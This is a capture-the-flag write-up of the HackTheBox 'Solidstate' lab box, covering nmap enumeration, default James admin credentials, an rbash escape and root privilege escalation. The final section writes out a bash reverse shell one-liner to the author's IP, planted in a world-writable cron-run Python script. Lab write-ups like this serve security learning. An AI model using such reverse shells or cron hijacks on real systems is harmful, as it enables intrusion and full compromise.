Title: HTB Solidstate box writeup
Tags: oscp, htb, cron, james, pop3, rbash
Summary: A very lab-alike box
Date: 2020-09-21 15:00
Status: published

# Enumeration
As always, starting with the full TCP range scan:
```text
    Nmap 7.80 scan initiated Sun Sep 20 20:28:25 2020 as: nmap -sS -p- -oA enum/nmap-ss-all 10.10.10.51
    Nmap scan report for solidstate.htb (10.10.10.51)
    Host is up (0.056s latency).
    Not shown: 65529 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    25/tcp   open  smtp
    80/tcp   open  http
    110/tcp  open  pop3
    119/tcp  open  nntp
    4555/tcp open  rsip
    Nmap done at Sun Sep 20 20:29:04 2020 -- 1 IP address (1 host up) scanned in 38.35 seconds
```
And continuing with open ports:
```text
    Nmap 7.80 scan initiated Sun Sep 20 20:30:19 2020 as: nmap -sC -A -T4 -p22,25,80,110,119,4555 -oA enum/nmap-sCAT4-open 10.10.10.51
    Nmap scan report for solidstate.htb (10.10.10.51)
    Host is up (0.054s latency).
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
    |   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
    |_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
    25/tcp   open  smtp        JAMES smtpd 2.3.2
    |_smtp-commands: solidstate Hello solidstate.htb (10.10.14.34 [10.10.14.34]), 
    80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Home - Solid State Security
    110/tcp  open  pop3        JAMES pop3d 2.3.2
    119/tcp  open  nntp        JAMES nntpd (posting ok)
    4555/tcp open  james-admin JAMES Remote Admin 2.3.2
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    TRACEROUTE (using port 25/tcp)
    HOP RTT      ADDRESS
    1   54.21 ms 10.10.14.1
    2   54.37 ms solidstate.htb (10.10.10.51)
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Sun Sep 20 20:30:47 2020 -- 1 IP address (1 host up) scanned in 28.15 seconds
```

# Exploitation
After some manual inspection of these services, it turned out that creds for James admin console are `root:root`:

![james root](/cstatic/htb-solidstate/james-root.png)

Mindy creds work for SSH, but we are logging in into restricted shell:

![rbash](/cstatic/htb-solidstate/mindy-rbash.png)

However, even this restricted shell allows to grab user flag since `cat` is allowed. 
[This exploit](https://www.exploit-db.com/exploits/35513) allows us to get out of rbash as mindy. I've
also tried to poke around with initial shell, but haven't got any useful info with `cat` and `ls` only.
`env` looks broken in there, more like symlink to nonexistent file. 

# Privilege escalation
There's an interesting world-writable file at `/opt/tmp.py`:
```python
    #!/usr/bin/env python
    import os
    import sys
    try:
         os.system('rm -r /tmp/* ')
    except:
         sys.exit()
```
I've already noticed that `/tmp` is being cleared frequently and this script seems to be running via
cron. Added usual bash revshell oneliner `/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.34/443 0>&1'` and
got a root shell:

![root shell](/cstatic/htb-solidstate/root-shell.png)
